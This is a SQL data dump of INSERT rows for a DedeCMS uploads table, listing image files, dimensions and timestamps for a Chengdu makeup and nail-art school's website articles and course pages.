INSERT INTO dede_uploads VALUES ('72', '60', '高级讲师', '/uploads/150417/1-15041G24K0401.png', '1', '151', '153', '0', '40723', '1429246070', '1');
INSERT INTO dede_uploads VALUES ('73', '60', '高级讲师', '/uploads/150417/1-15041G24R3309.jpg', '1', '364', '209', '0', '33617', '1429246103', '1');
INSERT INTO dede_uploads VALUES ('74', '70', '　　群丽化妆学校参与精功国际模特大赛化妆活', '/uploads/allimg/150417/1-15041G25243F4.jpg', '1', '650', '846', '0', '339858', '1429246363', '1');
INSERT INTO dede_uploads VALUES ('75', '59', '凯丽老师', '/uploads/150417/1-15041G25I5Y7.jpg', '1', '364', '209', '0', '28501', '1429246655', '1');
INSERT INTO dede_uploads VALUES ('76', '59', '凯丽老师', '/uploads/150417/1-15041G25Kb18.png', '1', '151', '153', '0', '37414', '1429246679', '1');
INSERT INTO dede_uploads VALUES ('77', '49', '叶丽老师', '/uploads/150417/1-15041G3000W31.jpg', '1', '364', '209', '0', '31405', '1429246808', '1');
INSERT INTO dede_uploads VALUES ('78', '49', '叶丽老师', '/uploads/150417/1-15041G30026394.png', '1', '151', '153', '0', '41679', '1429246826', '1');
INSERT INTO dede_uploads VALUES ('79', '71', '朱丹、小P老师来蓉，群丽化妆学校倾情助阵', '/uploads/allimg/150417/1-15041G3033Y53.jpg', '1', '1920', '1080', '0', '136899', '1429247018', '1');
INSERT INTO dede_uploads VALUES ('80', '71', '朱丹、小P老师来蓉，群丽化妆学校倾情助阵', '/uploads/allimg/150417/1-15041G30U59D.png', '1', '687', '942', '0', '1035257', '1429247335', '1');
INSERT INTO dede_uploads VALUES ('81', '71', '朱丹、小P老师来蓉，群丽化妆学校倾情助阵', '/uploads/allimg/150417/1-15041G31010J3.png', '1', '687', '942', '0', '1081924', '1429247410', '1');
INSERT INTO dede_uploads VALUES ('82', '71', '朱丹、小P老师来蓉，群丽化妆学校倾情助阵', '/uploads/allimg/150417/1-15041G3141DZ.jpg', '1', '1200', '675', '0', '137305', '1429247656', '1');
INSERT INTO dede_uploads VALUES ('83', '72', '亨得利特邀群丽化妆讲师为其员工进行专业彩妆', '/uploads/allimg/150417/1-15041G32151191.jpg', '1', '500', '332', '0', '78334', '1429248111', '1');
INSERT INTO dede_uploads VALUES ('84', '72', '亨得利特邀群丽化妆讲师为其员工进行专业彩妆', '/uploads/allimg/150417/1-15041G322103K.jpg', '1', '500', '332', '0', '75395', '1429248130', '1');
INSERT INTO dede_uploads VALUES ('85', '72', '亨得利特邀群丽化妆讲师为其员工进行专业彩妆', '/uploads/allimg/150417/1-15041G3232JX.jpg', '1', '500', '332', '0', '92438', '1429248207', '1');
INSERT INTO dede_uploads VALUES ('86', '72', '亨得利特邀群丽化妆讲师为其员工进行专业彩妆', '/uploads/allimg/150417/1-15041G32351637.jpg', '1', '500', '332', '0', '68125', '1429248231', '1');
INSERT INTO dede_uploads VALUES ('87', '72', '亨得利特邀群丽化妆讲师为其员工进行专业彩妆', '/uploads/allimg/150417/1-15041G3242Q61.jpg', '1', '500', '332', '0', '94595', '1429248268', '1');
INSERT INTO dede_uploads VALUES ('88', '73', '200期学员毕业', '/uploads/allimg/150417/1-15041G3305B48.jpg', '1', '6016', '4016', '0', '967589', '1429248656', '1');
INSERT INTO dede_uploads VALUES ('89', '73', '200期学员毕业', '/uploads/allimg/150417/1-15041G34432191.jpg', '1', '6016', '4016', '0', '967589', '1429249472', '1');
INSERT INTO dede_uploads VALUES ('90', '73', '200期学员毕业', '/uploads/allimg/150417/1-15041G34FQ49.jpg', '1', '1200', '801', '0', '149949', '1429249628', '1');
INSERT INTO dede_uploads VALUES ('91', '73', '200期学员毕业', '/uploads/allimg/150417/1-15041G34K1443.jpg', '1', '1070', '714', '0', '129992', '1429249671', '1');
INSERT INTO dede_uploads VALUES ('92', '74', '201期毕业学员留影', '/uploads/allimg/150417/1-15041G4001W16.jpg', '1', '1022', '681', '0', '115701', '1429250418', '1');
INSERT INTO dede_uploads VALUES ('93', '65', '作品1', '/uploads/150417/1-15041G40I5F8.png', '1', '322', '275', '0', '121284', '1429250855', '1');
INSERT INTO dede_uploads VALUES ('94', '75', '178期优秀学员赵媛作品', '/uploads/150417/1-15041G40952618.png', '1', '322', '275', '0', '123012', '1429250992', '1');
INSERT INTO dede_uploads VALUES ('95', '76', '学员作品4', '/uploads/150417/1-15041G41144916.png', '1', '322', '275', '0', '112561', '1429251104', '1');
INSERT INTO dede_uploads VALUES ('96', '77', '学生作品5', '/uploads/150417/1-15041G4121A94.png', '1', '322', '275', '0', '131953', '1429251136', '1');
INSERT INTO dede_uploads VALUES ('97', '78', '学生作品6', '/uploads/allimg/150417/1-15041G412420-L.png', '1', '0', '0', '0', '126650', '1429251162', '1');
INSERT INTO dede_uploads VALUES ('98', '78', '学生作品6', '/uploads/150417/1-15041G41300616.png', '1', '322', '275', '0', '126650', '1429251180', '1');
INSERT INTO dede_uploads VALUES ('99', '79', '学生作品7', '/uploads/150417/1-15041G41325N6.png', '1', '322', '275', '0', '125685', '1429251205', '1');
INSERT INTO dede_uploads VALUES ('100', '80', '学生作品8', '/uploads/150417/1-15041G41355928.png', '1', '322', '275', '0', '134782', '1429251235', '1');
INSERT INTO dede_uploads VALUES ('101', '57', '成都航空公司联合群丽化妆学校举办职员妆面培', '/uploads/allimg/150417/1-15041G4155W61.jpg', '1', '1022', '681', '0', '150737', '1429251358', '1');
INSERT INTO dede_uploads VALUES ('102', '57', '成都航空公司联合群丽化妆学校举办职员妆面培', '/uploads/allimg/150417/1-15041G41626351.jpg', '1', '1022', '681', '0', '144835', '1429251386', '1');
INSERT INTO dede_uploads VALUES ('103', '57', '成都航空公司联合群丽化妆学校举办职员妆面培', '/uploads/allimg/150417/1-15041G41A0Z1.jpg', '1', '1022', '681', '0', '149993', '1429251410', '1');
INSERT INTO dede_uploads VALUES ('104', '57', '成都航空公司联合群丽化妆学校举办职员妆面培', '/uploads/allimg/150417/1-15041G41K4117.jpg', '1', '1022', '681', '0', '130373', '1429251474', '1');
INSERT INTO dede_uploads VALUES ('105', '57', '成都航空公司联合群丽化妆学校举办职员妆面培', '/uploads/allimg/150417/1-15041G41RMR.jpg', '1', '1022', '681', '0', '141643', '1429251507', '1');
INSERT INTO dede_uploads VALUES ('106', '57', '成都航空公司联合群丽化妆学校举办职员妆面培', '/uploads/allimg/150417/1-15041G41U0P4.jpg', '1', '1022', '681', '0', '190351', '1429251530', '1');
INSERT INTO dede_uploads VALUES ('107', '57', '成都航空公司联合群丽化妆学校举办职员妆面培', '/uploads/allimg/150417/1-15041G41939325.jpg', '1', '1022', '681', '0', '151028', '1429251579', '1');
INSERT INTO dede_uploads VALUES ('108', '81', '韩国性感天后蔡妍（이채연이채연）现身于成都', '/uploads/allimg/150417/1-15041G43101335.png', '1', '640', '1136', '0', '939283', '1429252261', '1');
INSERT INTO dede_uploads VALUES ('109', '81', '韩国性感天后蔡妍（이채연이채연）现身于成都', '/uploads/allimg/150417/1-15041G4314Y23.PNG', '1', '640', '1013', '0', '1065365', '1429252308', '1');
INSERT INTO dede_uploads VALUES ('110', '81', '韩国性感天后蔡妍（이채연이채연）现身于成都', '/uploads/allimg/150417/1-15041G43554215.jpg', '1', '640', '1136', '0', '133311', '1429252554', '1');
INSERT INTO dede_uploads VALUES ('111', '81', '韩国性感天后蔡妍（이채연이채연）现身于成都', '/uploads/allimg/150417/1-15041G4362b38.jpg', '1', '640', '1013', '0', '121940', '1429252589', '1');
INSERT INTO dede_uploads VALUES ('112', '81', '韩国性感天后蔡妍（이채연이채연）现身于成都', '/uploads/allimg/150417/1-15041G43HUc.jpg', '1', '640', '1136', '0', '115062', '1429252648', '1');
INSERT INTO dede_uploads VALUES ('113', '81', '韩国性感天后蔡妍（이채연이채연）现身于成都', '/uploads/allimg/150417/1-15041G43Z13U.jpg', '1', '640', '731', '0', '349498', '1429252741', '1');
INSERT INTO dede_uploads VALUES ('114', '81', '韩国性感天后蔡妍（이채연이채연）现身于成都', '/uploads/allimg/150417/1-15041G44040914.jpg', '1', '640', '420', '0', '99932', '1429252840', '1');
INSERT INTO dede_uploads VALUES ('115', '81', '韩国性感天后蔡妍（이채연이채연）现身于成都', '/uploads/allimg/150417/1-15041G4405SO.JPG', '1', '2448', '3264', '0', '302305', '1429252858', '1');
INSERT INTO dede_uploads VALUES ('116', '81', '韩国性感天后蔡妍（이채연이채연）现身于成都', '/uploads/allimg/150417/1-15041G4421a41.JPG', '1', '1022', '1363', '0', '113891', '1429252939', '1');
INSERT INTO dede_uploads VALUES ('117', '81', '韩国性感天后蔡妍（이채연이채연）现身于成都', '/uploads/allimg/150417/1-15041G44241N4.JPG', '1', '1022', '1363', '0', '95630', '1429252961', '1');
INSERT INTO dede_uploads VALUES ('118', '81', '韩国性感天后蔡妍（이채연이채연）现身于成都', '/uploads/allimg/150417/1-15041G44420934.JPG', '1', '1022', '1363', '0', '91330', '1429253060', '1');
INSERT INTO dede_uploads VALUES ('119', '81', '韩国性感天后蔡妍（이채연이채연）现身于成都', '/uploads/allimg/150417/1-15041G44544318.JPG', '1', '1022', '690', '0', '62400', '1429253144', '1');
INSERT INTO dede_uploads VALUES ('120', '82', '群丽化妆4月火爆招生', '/uploads/allimg/150417/1-15041G456103Z.jpg', '1', '1000', '360', '0', '238190', '1429253770', '1');
INSERT INTO dede_uploads VALUES ('423', '79', '学生作品7', '/uploads/150524/1-15052415564EE.jpg', '1', '322', '275', '0', '71622', '1432454206', '1');
INSERT INTO dede_uploads VALUES ('422', '79', '学生作品7', '/uploads/150524/1-1505241555252R.jpg', '1', '322', '237', '0', '124030', '1432454125', '1');
INSERT INTO dede_uploads VALUES ('426', '105', '5个月 专业形象设计师培训研修班', '/uploads/allimg/150525/1-15052510211LK.jpg', '1', '589', '800', '0', '82003', '1432520477', '1');
INSERT INTO dede_uploads VALUES ('425', '119', '205期学员作品', '/uploads/150524/1-150524160335515.jpg', '1', '322', '275', '0', '87575', '1432454615', '1');
INSERT INTO dede_uploads VALUES ('424', '78', '学生作品6', '/uploads/150524/1-150524155PE43.jpg', '1', '322', '275', '0', '84322', '1432454286', '1');
INSERT INTO dede_uploads VALUES ('431', '105', '5个月 专业形象设计师培训研修班', '/uploads/allimg/150525/1-15052510332a09.jpg', '1', '589', '800', '0', '82003', '1432521209', '1');
INSERT INTO dede_uploads VALUES ('430', '105', '5个月 专业形象设计师培训研修班', '/uploads/allimg/150525/1-15052510221D44.jpg', '1', '589', '800', '0', '81416', '1432520536', '1');
INSERT INTO dede_uploads VALUES ('429', '105', '5个月 专业形象设计师培训研修班', '/uploads/allimg/150525/1-150525102203551.jpg', '1', '589', '800', '0', '79821', '1432520523', '1');
INSERT INTO dede_uploads VALUES ('428', '105', '5个月 专业形象设计师培训研修班', '/uploads/allimg/150525/1-15052510214T38.jpg', '1', '589', '800', '0', '84455', '1432520508', '1');
INSERT INTO dede_uploads VALUES ('427', '105', '5个月 专业形象设计师培训研修班', '/uploads/allimg/150525/1-150525102132549.jpg', '1', '589', '800', '0', '85771', '1432520492', '1');
INSERT INTO dede_uploads VALUES ('131', '2', '老学员答谢之“美丽课堂”讲座', '/uploads/allimg/150417/1-15041G55224546.jpg', '1', '649', '832', '0', '173105', '1429257144', '1');
INSERT INTO dede_uploads VALUES ('132', '2', '老学员答谢之“美丽课堂”讲座', '/uploads/allimg/150417/1-15041G5542Hb.jpg', '1', '520', '966', '0', '199564', '1429257267', '1');
INSERT INTO dede_uploads VALUES ('133', '2', '老学员答谢之“美丽课堂”讲座', '/uploads/allimg/150417/1-15041G55512127.JPG', '1', '1022', '682', '0', '208062', '1429257312', '1');
INSERT INTO dede_uploads VALUES ('134', '2', '老学员答谢之“美丽课堂”讲座', '/uploads/allimg/150417/1-15041G55544631.JPG', '1', '1022', '682', '0', '149606', '1429257344', '1');
INSERT INTO dede_uploads VALUES ('135', '2', '老学员答谢之“美丽课堂”讲座', '/uploads/allimg/150417/1-15041G5560HC.JPG', '1', '1022', '682', '0', '117392', '1429257367', '1');
INSERT INTO dede_uploads VALUES ('136', '52', '199期学员刘静【唯视觉】化妆执行总监', '/uploads/150417/1-15041G60222M5.png', '1', '220', '231', '0', '68631', '1429257742', '1');
INSERT INTO dede_uploads VALUES ('137', '52', '199期学员刘静【唯视觉】化妆执行总监', '/uploads/150417/1-15041G602405J.png', '1', '220', '231', '0', '59812', '1429257760', '1');
INSERT INTO dede_uploads VALUES ('138', '74', '201期毕业学员留影', '/uploads/allimg/150417/1-15041G60356430.jpg', '1', '1022', '681', '0', '115658', '1429257836', '1');
INSERT INTO dede_uploads VALUES ('139', '73', '200期学员毕业留影', '/uploads/allimg/150417/1-15041G60600910.jpg', '1', '1070', '714', '0', '130113', '1429257960', '1');
INSERT INTO dede_uploads VALUES ('140', '85', '晚睡的危害', '/uploads/allimg/150417/1-15041G6161X24.jpg', '1', '1728', '2684', '0', '238939', '1429258578', '1');
INSERT INTO dede_uploads VALUES ('141', '85', '晚睡的危害', '/uploads/allimg/150417/1-15041G61911M7.jpg', '1', '658', '1022', '0', '312381', '1429258751', '1');
INSERT INTO dede_uploads VALUES ('142', '61', '群丽学校美甲学员【李静】创业明星', '/uploads/150417/1-15041G6340b27.png', '1', '220', '231', '0', '70275', '1429259649', '1');
INSERT INTO dede_uploads VALUES ('143', '61', '群丽学校美甲学员【李静】创业明星', '/uploads/150417/1-15041G6342Lc.png', '1', '220', '231', '0', '78007', '1429259667', '1');
INSERT INTO dede_uploads VALUES ('144', '86', '学化妆是去影楼还是专业的化妆学校？', '/uploads/allimg/150417/1-15041G6410O20.jpg', '1', '658', '403', '0', '165580', '1429260067', '1');
INSERT INTO dede_uploads VALUES ('145', '86', '学化妆是去影楼还是专业的化妆学校？', '/uploads/allimg/150417/1-15041G64133927.jpg', '1', '391', '220', '0', '7914', '1429260093', '1');
INSERT INTO dede_uploads VALUES ('146', '58', '群丽学校化妆美甲学员【廖雪梅】创业明星', '/uploads/150417/1-15041G6421BT.png', '1', '220', '231', '0', '66467', '1429260136', '1');
INSERT INTO dede_uploads VALUES ('147', '58', '群丽学校化妆美甲学员【廖雪梅】创业明星', '/uploads/150417/1-15041G64304F8.png', '1', '220', '231', '0', '61723', '1429260184', '1');
INSERT INTO dede_uploads VALUES ('148', '87', '中国成韩国最大化妆品出口国', '/uploads/allimg/150417/1-15041G64923155.jpg', '1', '550', '356', '0', '89716', '1429260563', '1');
INSERT INTO dede_uploads VALUES ('149', '87', '中国成韩国最大化妆品出口国', '/uploads/allimg/150417/1-15041G6493S30.jpg', '1', '539', '386', '0', '94674', '1429260578', '1');
INSERT INTO dede_uploads VALUES ('150', '88', '【夏颖】36期优秀学员', '/uploads/allimg/150417/1-15041G649390-L.png', '1', '0', '0', '0', '90302', '1429260579', '1');
INSERT INTO dede_uploads VALUES ('151', '88', '【夏颖】36期优秀学员', '/uploads/150417/1-15041G64952X3.png', '1', '220', '231', '0', '90302', '1429260592', '1');
INSERT INTO dede_uploads VALUES ('152', '87', '中国成韩国最大化妆品出口国', '/uploads/allimg/150417/1-15041G6495X63.jpg', '1', '528', '424', '0', '205429', '1429260598', '1');
INSERT INTO dede_uploads VALUES ('153', '88', '【夏颖】36期优秀学员', '/uploads/150417/1-15041GA014X6.png', '1', '220', '231', '0', '75718', '1429260614', '1');
INSERT INTO dede_uploads VALUES ('154', '88', '【夏颖】36期优秀学员', '/uploads/150417/1-15041GA049420.jpg', '1', '670', '503', '0', '466881', '1429260649', '1');
INSERT INTO dede_uploads VALUES ('155', '88', '【夏颖】36期优秀学员', '/uploads/150417/1-15041GA131117.jpg', '1', '552', '442', '0', '91892', '1429260691', '1');
INSERT INTO dede_uploads VALUES ('156', '89', '【母瑾】157期优秀学员', '/uploads/150417/1-15041GA511T9.png', '1', '220', '231', '0', '80033', '1429260911', '1');
INSERT INTO dede_uploads VALUES ('157', '89', '【母瑾】157期优秀学员', '/uploads/150417/1-15041GA540191.png', '1', '220', '231', '0', '75597', '1429260940', '1');
INSERT INTO dede_uploads VALUES ('158', '89', '【母瑾】157期优秀学员', '/uploads/150417/1-15041GA614U0.png', '1', '497', '497', '0', '573955', '1429260974', '1');
INSERT INTO dede_uploads VALUES ('159', '90', '五招教你辨别化妆品真伪', '/uploads/allimg/150417/1-15041GAG4192.jpg', '1', '320', '320', '0', '68688', '1429261034', '1');
INSERT INTO dede_uploads VALUES ('160', '90', '五招教你辨别化妆品真伪', '/uploads/allimg/150417/1-15041GA925925.jpg', '1', '1022', '602', '0', '135931', '1429261165', '1');
INSERT INTO dede_uploads VALUES ('161', '90', '五招教你辨别化妆品真伪', '/uploads/allimg/150417/1-15041GF0392L.jpg', '1', '651', '1000', '0', '63132', '1429261239', '1');
INSERT INTO dede_uploads VALUES ('162', '90', '五招教你辨别化妆品真伪', '/uploads/allimg/150417/1-15041GF140V0.jpg', '1', '499', '220', '0', '20604', '1429261300', '1');
INSERT INTO dede_uploads VALUES ('163', '91', '青春痘真是那么烦人吗？', '/uploads/allimg/150417/1-15041GG0095L.jpg', '1', '500', '347', '0', '40091', '1429261809', '1');
INSERT INTO dede_uploads VALUES ('164', '91', '青春痘真是那么烦人吗？', '/uploads/allimg/150417/1-15041GG1305L.jpg', '1', '400', '285', '0', '62366', '1429261890', '1');
INSERT INTO dede_uploads VALUES ('165', '91', '青春痘真是那么烦人吗？', '/uploads/allimg/150417/1-15041GG63N57.jpg', '1', '800', '600', '0', '136703', '1429262197', '1');
INSERT INTO dede_uploads VALUES ('166', '91', '青春痘真是那么烦人吗？', '/uploads/allimg/150417/1-15041GGG64I.jpg', '1', '335', '220', '0', '7492', '1429262236', '1');
INSERT INTO dede_uploads VALUES ('167', '91', '青春痘真是那么烦人吗？', '/uploads/allimg/150417/1-15041GGQ3R1.jpg', '1', '331', '220', '0', '9028', '1429262293', '1');
INSERT INTO dede_uploads VALUES ('168', '92', '时尚彩妆研修班', '/uploads/150418/1-15041Q12U02K.jpg', '1', '380', '250', '0', '41807', '1429327730', '1');
INSERT INTO dede_uploads VALUES ('169', '93', '美容创业培训班', '/uploads/150418/1-15041Q14646143.png', '1', '380', '250', '0', '121993', '1429328806', '1');
INSERT INTO dede_uploads VALUES ('170', '94', '美甲', '/uploads/150418/1-15041Q1500b05.jpg', '1', '380', '250', '0', '94601', '1429329009', '1');
INSERT INTO dede_uploads VALUES ('171', '95', '整体造型全科班', '/uploads/150418/1-15041Q20335239.jpg', '1', '380', '250', '0', '84887', '1429329815', '1');
INSERT INTO dede_uploads VALUES ('172', '0', '150418/1-15041Q20ZB17.jpg', '/uploads/150418/1-15041Q20ZB17.jpg', '1', '210', '142', '0', '45806', '1429330146', '1');
INSERT INTO dede_uploads VALUES ('433', '105', '5个月 专业形象设计师培训研修班', '/uploads/allimg/150525/1-1505251033551a.jpg', '1', '589', '800', '0', '84455', '1432521235', '1');
INSERT INTO dede_uploads VALUES ('432', '105', '5个月 专业形象设计师培训研修班', '/uploads/allimg/150525/1-150525103341246.jpg', '1', '589', '800', '0', '85771', '1432521221', '1');
INSERT INTO dede_uploads VALUES ('175', '98', '化妆品真能放冰箱吗？', '/uploads/allimg/150418/1-15041Q329592L.png', '1', '498', '372', '0', '264513', '1429334999', '1');
INSERT INTO dede_uploads VALUES ('176', '98', '化妆品真能放冰箱吗？', '/uploads/allimg/150418/1-15041Q332325c.png', '1', '498', '372', '0', '264513', '1429335152', '1');
INSERT INTO dede_uploads VALUES ('177', '2', '老学员答谢之“美丽课堂”讲座', '/uploads/150418/1-15041Q55I33O.png', '1', '687', '942', '0', '1394381', '1429343853', '1');
INSERT INTO dede_uploads VALUES ('178', '2', '老学员答谢之“美丽课堂”讲座', '/uploads/150418/1-15041Q55I33O-lp.png', '1', '0', '0', '0', '69811', '1429343871', '1');
INSERT INTO dede_uploads VALUES ('179', '0', '150420/1-150420125334526.png', '/uploads/allimg/150420/1-150420125334526.png', '1', '816', '544', '0', '470270', '1429505614', '1');
INSERT INTO dede_uploads VALUES ('180', '0', '150420/1-150420125425G9.png', '/uploads/allimg/150420/1-150420125425G9.png', '1', '819', '528', '0', '635078', '1429505665', '1');
INSERT INTO dede_uploads VALUES ('181', '0', '150420/1-15042012550H35.png', '/uploads/allimg/150420/1-15042012550H35.png', '1', '980', '449', '0', '486124', '1429505707', '1');
INSERT INTO dede_uploads VALUES ('182', '0', '150420/1-150420125U0391.png', '/uploads/allimg/150420/1-150420125U0391.png', '1', '975', '549', '0', '974835', '1429505930', '1');
INSERT INTO dede_uploads VALUES ('183', '0', '150420/1-15042013015D47.png', '/uploads/allimg/150420/1-15042013015D47.png', '1', '906', '239', '0', '268665', '1429506116', '1');
INSERT INTO dede_uploads VALUES ('184', '0', '150420/1-1504201305511a.png', '/uploads/allimg/150420/1-1504201305511a.png', '1', '977', '362', '0', '479190', '1429506351', '1');
INSERT INTO dede_uploads VALUES ('185', '0', '150420/1-150420130G0415.png', '/uploads/allimg/150420/1-150420130G0415.png', '1', '984', '348', '0', '478159', '1429506430', '1');
INSERT INTO dede_uploads VALUES ('186', '0', '150420/1-150420131043923.png', '/uploads/allimg/150420/1-150420131043923.png', '1', '608', '467', '0', '493816', '1429506643', '1');
INSERT INTO dede_uploads VALUES ('187', '0', '150420/1-150420131130962.png', '/uploads/allimg/150420/1-150420131130962.png', '1', '594', '468', '0', '520205', '1429506690', '1');
INSERT INTO dede_uploads VALUES ('188', '0', '150420/1-150420131204291.png', '/uploads/allimg/150420/1-150420131204291.png', '1', '612', '467', '0', '445716', '1429506724', '1');
INSERT INTO dede_uploads VALUES ('189', '0', '150420/1-15042013130X57.png', '/uploads/allimg/150420/1-15042013130X57.png', '1', '607', '596', '0', '578151', '1429506788', '1');
INSERT INTO dede_uploads VALUES ('190', '0', '150420/1-150420131335636.png', '/uploads/allimg/150420/1-150420131335636.png', '1', '728', '454', '0', '532352', '1429506815', '1');
INSERT INTO dede_uploads VALUES ('191', '0', '150420/1-15042013144C08.png', '/uploads/allimg/150420/1-15042013144C08.png', '1', '690', '599', '0', '469679', '1429506886', '1');
INSERT INTO dede_uploads VALUES ('192', '0', '150420/1-150420131620S9.png', '/uploads/allimg/150420/1-150420131620S9.png', '1', '733', '487', '0', '548907', '1429506980', '1');
INSERT INTO dede_uploads VALUES ('193', '0', '150420/1-150420131J1461.png', '/uploads/allimg/150420/1-150420131J1461.png', '1', '594', '468', '0', '520205', '1429507061', '1');
INSERT INTO dede_uploads VALUES ('194', '0', '150420/1-15042013200SM.png', '/uploads/allimg/150420/1-15042013200SM.png', '1', '564', '512', '0', '561754', '1429507208', '1');
INSERT INTO dede_uploads VALUES ('195', '0', '150420/1-1504201322032M.png', '/uploads/allimg/150420/1-1504201322032M.png', '1', '949', '522', '0', '568838', '1429507323', '1');
INSERT INTO dede_uploads VALUES ('196', '94', '美甲', '/uploads/150422/1-150422154A2C5.jpg', '1', '589', '800', '0', '140965', '1429688812', '1');
INSERT INTO dede_uploads VALUES ('197', '94', '美甲', '/uploads/150422/150422/1-150422155010620.jpg', '1', '545', '543', '0', '28725', '1429689010', '1');
INSERT INTO dede_uploads VALUES ('198', '94', '美睫', '/uploads/150422/1-150422155T55B.jpg', '1', '380', '250', '0', '32357', '1429689525', '1');
INSERT INTO dede_uploads VALUES ('199', '100', '一个月课程介绍', '/uploads/allimg/150422/1-150422161334Y9.jpg', '1', '589', '800', '0', '135253', '1429690414', '1');
INSERT INTO dede_uploads VALUES ('200', '95', '个人化妆周末班', '/uploads/150422/1-150422161529348.jpg', '1', '380', '250', '0', '41871', '1429690529', '1');
INSERT INTO dede_uploads VALUES ('201', '100', '一个月课程介绍', '/uploads/allimg/150422/1-150422161U6464.jpg', '1', '593', '830', '0', '44763', '1429690736', '1');
INSERT INTO dede_uploads VALUES ('202', '100', '一个月课程介绍', '/uploads/allimg/150422/1-1504221619255D.jpg', '1', '294', '391', '0', '36495', '1429690765', '1');
INSERT INTO dede_uploads VALUES ('203', '101', '个人化妆VIP班', '/uploads/150422/1-150422162024648.jpg', '1', '380', '250', '0', '24843', '1429690824', '1');
INSERT INTO dede_uploads VALUES ('204', '100', '一个月课程介绍', '/uploads/allimg/150422/1-150422162033551.jpg', '1', '593', '830', '0', '89103', '1429690833', '1');
INSERT INTO dede_uploads VALUES ('205', '101', '个人化妆VIP班', '/uploads/150422/1-150422162135350.jpg', '1', '589', '800', '0', '128432', '1429690895', '1');
INSERT INTO dede_uploads VALUES ('206', '95', '个人化妆周末班', '/uploads/150422/1-150422162249562.jpg', '1', '589', '800', '0', '124127', '1429690969', '1');
INSERT INTO dede_uploads VALUES ('207', '100', '一个月课程介绍', '/uploads/150422/1-15042216260D23.jpg', '1', '380', '459', '0', '57451', '1429691166', '1');
INSERT INTO dede_uploads VALUES ('208', '100', '一个月课程介绍', '/uploads/150422/1-15042216260D23-lp.jpg', '1', '0', '0', '0', '8016', '1429691199', '1');
INSERT INTO dede_uploads VALUES ('209', '100', '一个月课程介绍', '/uploads/150422/1-150422162S55Q.png', '1', '380', '250', '0', '113674', '1429691315', '1');
INSERT INTO dede_uploads VALUES ('210', '102', '专业形象设计师培训基础班 2个月', '/uploads/allimg/150422/1-150422163052W5.jpg', '1', '589', '800', '0', '141953', '1429691452', '1');
INSERT INTO dede_uploads VALUES ('211', '102', '专业形象设计师培训基础班 2个月', '/uploads/allimg/150422/1-1504221635230-L.jpg', '1', '0', '0', '0', '57177', '1429691723', '1');
INSERT INTO dede_uploads VALUES ('212', '102', '专业形象设计师培训基础班 2个月', '/uploads/150422/1-150422163G3N9.jpg', '1', '380', '250', '0', '57177', '1429691833', '1');
INSERT INTO dede_uploads VALUES ('213', '102', '专业形象设计师培训基础班 2个月', '/uploads/allimg/150422/1-150422163IG20.jpg', '1', '481', '690', '0', '42533', '1429691857', '1');
INSERT INTO dede_uploads VALUES ('214', '102', '专业形象设计师培训基础班 2个月', '/uploads/allimg/150422/1-150422163T45Z.jpg', '1', '481', '690', '0', '90700', '1429691924', '1');
INSERT INTO dede_uploads VALUES ('215', '102', '专业形象设计师培训基础班 2个月', '/uploads/allimg/150422/1-1504221640154O.jpg', '1', '285', '220', '0', '7923', '1429692015', '1');
INSERT INTO dede_uploads VALUES ('216', '93', '美甲专业班', '/uploads/150422/1-150422164430C8.jpg', '1', '380', '250', '0', '45411', '1429692270', '1');
INSERT INTO dede_uploads VALUES ('217', '0', '1-1504221645170-L.jpg', '/uploads/allimg/150422/1-1504221645170-L.jpg', '1', '0', '0', '0', '50386', '1429692317', '1');
INSERT INTO dede_uploads VALUES ('218', '103', '3个月 专业形象设计师培训基础班', '/uploads/allimg/150422/1-1504221646100-L.jpg', '1', '0', '0', '0', '50386', '1429692370', '1');
INSERT INTO dede_uploads VALUES ('219', '93', '美甲专业班', '/uploads/150422/1-1504221646495D.jpg', '1', '589', '800', '0', '165696', '1429692409', '1');
INSERT INTO dede_uploads VALUES ('220', '93', '美甲专业班', '/uploads/150422/1-150422164G2321.jpg', '1', '589', '800', '0', '160824', '1429692432', '1');
INSERT INTO dede_uploads VALUES ('221', '103', '3个月 专业形象设计师培训基础班', '/uploads/allimg/150422/1-150422164Z1548.jpg', '1', '589', '800', '0', '139675', '1429692541', '1');
INSERT INTO dede_uploads VALUES ('222', '104', '4个月 专业形象设计师培训研修班', '/uploads/allimg/150422/1-1504221A109595.jpg', '1', '589', '800', '0', '132782', '1429692669', '1');
INSERT INTO dede_uploads VALUES ('223', '104', '4个月 专业形象设计师培训研修班', '/uploads/allimg/150422/1-1504221A4000-L.jpg', '1', '0', '0', '0', '51983', '1429692841', '1');
INSERT INTO dede_uploads VALUES ('224', '104', '4个月 专业形象设计师培训研修班', '/uploads/allimg/150422/1-1504221AF0439.jpg', '1', '160', '220', '0', '6664', '1429693020', '1');
INSERT INTO dede_uploads VALUES ('225', '104', '4个月 专业形象设计师培训研修班', '/uploads/allimg/150422/1-1504221AH6344.jpg', '1', '160', '220', '0', '7286', '1429693046', '1');
INSERT INTO dede_uploads VALUES ('226', '104', '4个月 专业形象设计师培训研修班', '/uploads/allimg/150422/1-1504221A4000-L-lp.jpg', '1', '0', '0', '0', '8973', '1429693085', '1');
INSERT INTO dede_uploads VALUES ('227', '104', '4个月 专业形象设计师培训研修班', '/uploads/150422/1-1504221F004456.jpg', '1', '334', '220', '0', '10911', '1429693204', '1');
INSERT INTO dede_uploads VALUES ('228', '104', '4个月 专业形象设计师培训研修班', '/uploads/allimg/150422/1-1504221F02E32.jpg', '1', '500', '500', '0', '51983', '1429693226', '1');
INSERT INTO dede_uploads VALUES ('229', '104', '4个月 专业形象设计师培训研修班', '/uploads/150422/1-1504221F10LW.jpg', '1', '334', '220', '0', '10911', '1429693267', '1');
INSERT INTO dede_uploads VALUES ('230', '104', '4个月 专业形象设计师培训研修班', '/uploads/150422/1-1504221F201158.jpg', '1', '380', '250', '0', '45865', '1429693321', '1');
INSERT INTO dede_uploads VALUES ('231', '105', '5个月 专业形象设计师培训研修班', '/uploads/allimg/150422/1-1504221FQ44O.jpg', '1', '380', '250', '0', '41556', '1429693694', '1');
INSERT INTO dede_uploads VALUES ('232', '105', '5个月 专业形象设计师培训研修班', '/uploads/allimg/150422/1-1504221FS30-L.jpg', '1', '0', '0', '0', '41556', '1429693713', '1');
INSERT INTO dede_uploads VALUES ('233', '106', '美甲创业班', '/uploads/allimg/150422/1-1504221FU70-L.jpg', '1', '0', '0', '0', '44952', '1429693737', '1');
INSERT INTO dede_uploads VALUES ('234', '106', '美甲创业班', '/uploads/150422/1-1504221F924c4.jpg', '1', '380', '250', '0', '44952', '1429693764', '1');
